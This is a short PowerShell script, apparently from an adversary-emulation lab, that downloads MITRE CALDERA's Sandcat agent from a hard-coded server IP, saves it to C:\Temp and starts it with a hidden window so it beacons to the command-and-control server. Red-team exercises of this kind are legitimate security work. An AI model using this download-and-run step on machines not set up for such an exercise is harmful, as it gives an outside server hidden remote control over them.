################################################################################
# Deploy Sandcat Red Team Agent
# Run this on the Windows Red Agent VM
################################################################################

$ErrorActionPreference = "Stop"

$CALDERA_SERVER = "4.196.84.144"
$SERVER_URL = "http://$CALDERA_SERVER:8888"
$GROUP = "red"

Write-Host "🔴 Deploying Sandcat Red Team Agent..." -ForegroundColor Red
Write-Host "Server: $SERVER_URL" -ForegroundColor Cyan

# Create temp directory
$TempDir = "C:\Temp"
if (-not (Test-Path $TempDir)) {
    New-Item -ItemType Directory -Path $TempDir | Out-Null
}

# Download Sandcat agent
Write-Host "⬇️  Downloading agent..." -ForegroundColor Yellow

try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("file", "sandcat.go")
    $wc.Headers.Add("platform", "windows")
    $data = $wc.DownloadData("$SERVER_URL/file/download")
    $agentPath = "$TempDir\sandcat.exe"
    [IO.File]::WriteAllBytes($agentPath, $data)
    
    Write-Host "✅ Agent downloaded to $agentPath" -ForegroundColor Green
    
    # Start agent
    Write-Host "🚀 Starting agent..." -ForegroundColor Yellow
    $proc = Start-Process -FilePath $agentPath -ArgumentList "-server $SERVER_URL -group $GROUP -v" -WindowStyle Hidden -PassThru
    
    Write-Host "✅ Agent started (PID: $($proc.Id))" -ForegroundColor Green
    Write-Host ""
    Write-Host "Agent will beacon to CALDERA every 60 seconds" -ForegroundColor Cyan
    Write-Host "Check CALDERA UI -> Agents tab to see this agent" -ForegroundColor Cyan
    
} catch {
    Write-Host "❌ Error: $_" -ForegroundColor Red
    exit 1
}
